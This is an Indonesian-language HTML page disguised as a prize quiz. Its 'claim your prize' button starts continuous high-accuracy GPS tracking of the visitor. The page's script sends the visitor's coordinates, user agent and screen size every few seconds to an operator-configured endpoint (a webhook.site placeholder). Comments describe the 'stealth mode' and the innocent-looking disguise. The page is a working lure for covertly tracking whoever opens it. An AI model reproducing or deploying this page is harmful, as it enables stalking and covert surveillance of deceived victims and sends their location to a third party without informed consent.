<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🎯 Quiz Winner</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: #0a0a0f;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: 'Segoe UI', sans-serif;
      color: #fff;
    }
    .box {
      background: #16161f;
      padding: 40px 30px;
      border-radius: 40px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      border: 2px solid #6a4eff;
      box-shadow: 0 0 30px #6a4eff55;
    }
    h2 { font-size: 28px; margin-bottom: 10px; }
    .sub { color: #aaa; font-size: 14px; margin-bottom: 25px; }
    .btn {
      background: #6a4eff;
      border: none;
      padding: 16px;
      border-radius: 60px;
      width: 100%;
      font-size: 20px;
      font-weight: bold;
      color: #fff;
      cursor: pointer;
      transition: 0.2s;
      box-shadow: 0 0 20px #6a4eff88;
    }
    .btn:active { transform: scale(0.95); background: #8f73ff; }
    .status { margin-top: 20px; font-size: 14px; color: #0f0; }
    .hidden { display: none; }
  </style>
</head>
<body>
<div class="box" id="app">
  <h2>🏆 Kuis Hadiah!</h2>
  <div class="sub">Klik tombol di bawah untuk klaim hadiahmu 🎁</div>
  <button class="btn" id="startBtn">👉 Ambil Hadiah</button>
  <div class="status" id="statusText">⏳ Belum aktif</div>
</div>

<script>
  (function() {
    // === KONFIGURASI SERVER LO ===
    // Ganti URL di bawah dengan endpoint lo (misal webhook.site, atau server lo)
    const SERVER_URL = "https://webhook.site/your-unique-id"; // ⚠️ GANTI DENGAN URL LO
    const SEND_INTERVAL = 5000; // kirim tiap 5 detik (bisa 1000 buat realtime)

    let watchId = null;
    let intervalId = null;
    let lastCoords = null;
    const statusEl = document.getElementById('statusText');
    const startBtn = document.getElementById('startBtn');

    // Fungsi kirim data ke server
    function sendLocation(lat, lng, acc, timestamp) {
      if (!SERVER_URL || SERVER_URL === "https://webhook.site/your-unique-id") {
        statusEl.innerText = '⚠️ Ganti SERVER_URL dulu!';
        statusEl.style.color = '#ff6600';
        return;
      }
      const payload = {
        lat: lat,
        lng: lng,
        accuracy: acc || 0,
        timestamp: timestamp || new Date().toISOString(),
        userAgent: navigator.userAgent,
        screen: `${window.screen.width}x${window.screen.height}`,
        // extra: bisa tambah IP via fetch external, tapi gak usah ribet
      };
      // Kirim via POST
      fetch(SERVER_URL, {
        method: 'POST',
        mode: 'no-cors', // biar gak kena cors (tapi gak dapet respon)
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(e => console.log('Kirim error:', e));
      
      statusEl.innerText = `📍 Terkirim: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
      statusEl.style.color = '#0f0';
    }

    // Fungsi start pelacakan
    function startTracking() {
      if (!navigator.geolocation) {
        statusEl.innerText = '❌ GPS gak support';
        statusEl.style.color = '#f44';
        return;
      }

      // Minta izin & mulai watch
      watchId = navigator.geolocation.watchPosition(
        (pos) => {
          const coords = pos.coords;
          lastCoords = {
            lat: coords.latitude,
            lng: coords.longitude,
            acc: coords.accuracy,
            timestamp: pos.timestamp
          };
          // Kirim langsung
          sendLocation(lastCoords.lat, lastCoords.lng, lastCoords.acc, lastCoords.timestamp);
        },
        (err) => {
          statusEl.innerText = `⚠️ Error GPS: ${err.message}`;
          statusEl.style.color = '#f44';
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );

      // Kirim berkala walau posisi gak berubah (untuk jaga-jaga)
      intervalId = setInterval(() => {
        if (lastCoords) {
          sendLocation(lastCoords.lat, lastCoords.lng, lastCoords.acc, Date.now());
        }
      }, SEND_INTERVAL);

      statusEl.innerText = '📡 Tracking aktif... mengirim ke server';
      statusEl.style.color = '#0ff';
      startBtn.innerText = '✅ Sedang Lacak';
      startBtn.disabled = true;
    }

    // Event click tombol
    startBtn.addEventListener('click', () => {
      // Ubah UI biar keliatan kayak loading
      startBtn.innerText = '⏳ Meminta izin...';
      startTracking();
    });

    // Hentikan tracking kalo halaman ditutup (opsional)
    window.addEventListener('beforeunload', () => {
      if (watchId) navigator.geolocation.clearWatch(watchId);
      if (intervalId) clearInterval(intervalId);
    });

    // Mode stealth: gak ada indikasi visual selain tombol kuis
    // Biar keliatan innocent, ganti judul jadi "Kuis Hadiah"
  })();
</script>
</body>
</html>
